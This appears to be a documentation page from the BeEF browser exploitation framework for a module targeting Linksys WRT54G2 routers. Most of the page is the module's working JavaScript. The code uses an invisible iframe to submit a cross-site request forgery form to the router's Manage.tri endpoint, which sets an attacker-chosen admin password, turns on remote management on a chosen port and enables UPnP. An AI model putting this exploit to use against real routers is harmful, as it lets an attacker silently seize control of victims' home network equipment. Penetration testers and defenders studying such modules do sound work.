## Summary

* **Objective**: enable remote administration and change the password on a Linksys WRT54G2 router
* **Authors**: Martin Barbella
* **Browsers**: All

* [Code](https://github.com/beefproject/beef/tree/master/modules/exploits/router/linksys_wrt54g2_csrf)

## Internal Working

Uses an invisible iframe with a GET request to change config

```js
  var port    = '<%= @port %>';
  var gateway = '<%= @base %>';
  var passwd  = '<%= @password %>';
  var timeout = 15;

  var wrt54g2_iframe_<%= @command_id %> = beef.dom.createIframeXsrfForm(gateway + "Manage.tri", "POST", "application/x-www-form-urlencoded",
      [{'type':'hidden', 'name':'MANAGE_USE_HTTP', 'value':'0'} ,
       {'type':'hidden', 'name':'MANAGE_HTTP', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_HTTP_S', 'value':'0'},
       {'type':'hidden', 'name':'MANAGE_PASSWORDMOD', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_PASSWORD', 'value':passwd},
       {'type':'hidden', 'name':'MANAGE_PASSWORD_CONFIRM', 'value':passwd},
       {'type':'hidden', 'name':'_http_enable', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_WLFILTER', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_REMOTE', 'value':'1'},
       {'type':'hidden', 'name':'MANAGE_PORT', 'value':port},
       {'type':'hidden', 'name':'MANAGE_UPNP', 'value':'1'},
       {'type':'hidden', 'name':'layout', 'value':'en'}
      ]);

```

## Feedback

